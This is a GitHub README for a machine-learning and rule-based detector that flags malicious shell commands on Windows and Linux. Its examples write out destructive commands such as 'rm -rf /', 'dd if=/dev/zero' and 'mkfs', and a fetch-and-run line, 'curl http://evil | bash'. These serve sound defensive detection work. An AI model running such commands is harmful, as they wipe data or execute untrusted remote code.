# README.md (Final GitHub Version)


# 🛡️ Command History Risk Detection (ML + Hybrid)

[![Python](https://img.shields.io/badge/python-3.13-blue)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Model Accuracy](https://img.shields.io/badge/accuracy-97%25-brightgreen)]()

## 📌 Overview
This project detects **malicious and dangerous shell commands** using a **hybrid approach** combining:

- Machine Learning (SVM with TF-IDF)
- Rule-based detection
- Context-aware analysis

It supports **Windows and Linux** platforms and focuses on:
- Destructive commands
- System tool exploitation (LOLBins)
- Command injection
- Short or obfuscated commands

---

## 🎯 Motivation
Traditional signature-based detection often fails when:

- Commands are short (`rm -rf /`)
- Commands are obfuscated or encoded
- Legitimate system tools are exploited (LOLBins)

This project combines **ML, synthetic data augmentation, and rules** to overcome these challenges.

---

## 🧠 Detection Architecture

### 1️⃣ Machine Learning Layer
- **Model:** LinearSVC
- **Features:** Character-level TF-IDF
- **Why character-level?**
  - Effective for short commands
  - Detects obfuscation and minor variations
  - Platform-independent

### 2️⃣ Rule-Based Layer
Immediately detects known destructive commands like:
- `rm -rf /`
- `dd if=/dev/zero`
- `mkfs`
- Fork bombs
- Malicious PowerShell commands

### 3️⃣ Context-Aware Layer
- Tracks recent command history
- Increases risk score for repeated suspicious commands
- Helps detect slow or staged attacks

---

## 📂 Project Structure
```

command_ml/
├── data_raw_*.csv               # Original raw datasets from different sources
├── data_clean.csv               # Cleaned and merged dataset
│
├── merge_and_clean.py           # Script to merge and clean datasets 
├── train.py                     # Model training
├── predict.py                   # Interactive prediction
│
├── model.pkl                    # Trained ML model
├── vectorizer.pkl               # TF-IDF vectorizer
├── requirements.txt
├── README.md 
└── .gitignore

```

---

## 📊 Dataset
The data contains:

- Benign system commands
- Windows LOLBins
- Linux administrative commands
- Command injection payloads

### 🔥 Data Augmentation
Synthetic destructive commands were added to improve detection of rare but dangerous commands.  
Modifications include:

- Whitespace and quote variations
- Case sensitivity
- Wrapping in `bash -c`, `sh -c`, or PowerShell

---

## 🧪 Model Performance
After merging and augmenting data:

```

Accuracy: 97%
Recall (Malicious): 94%
F1-score: 97%

````

This demonstrates **high reliability** with very few false negatives.

---

## ▶️ Usage

### 1️⃣ Train the model
```bash
python train.py
````

### 2️⃣ Interactive prediction

```bash
python predict.py
```

Example:

```
> rm -rf /
MALICIOUS (rule-based)

> whoami
BENIGN

> curl http://evil | bash
MALICIOUS (ml)
```

---

## 🔬 Key Advantages

* Hybrid detection (ML + Rules)
* Context-aware analysis
* Detects short & obfuscated commands
* Cross-platform (Linux & Windows)
* Data augmentation for rare destructive commands

---

## 🚀 Future Work

* Sequence models (LSTM / Transformer)
* Real-time shell monitoring
* SIEM / EDR integration
* MITRE ATT&CK mapping

---

## ⚠️ Disclaimer

For **academic and research purposes only**.
Do not execute destructive commands on live systems.

---

## 👨‍💻 Author

Security-focused ML engineer. Contributions and research collaboration are welcome.

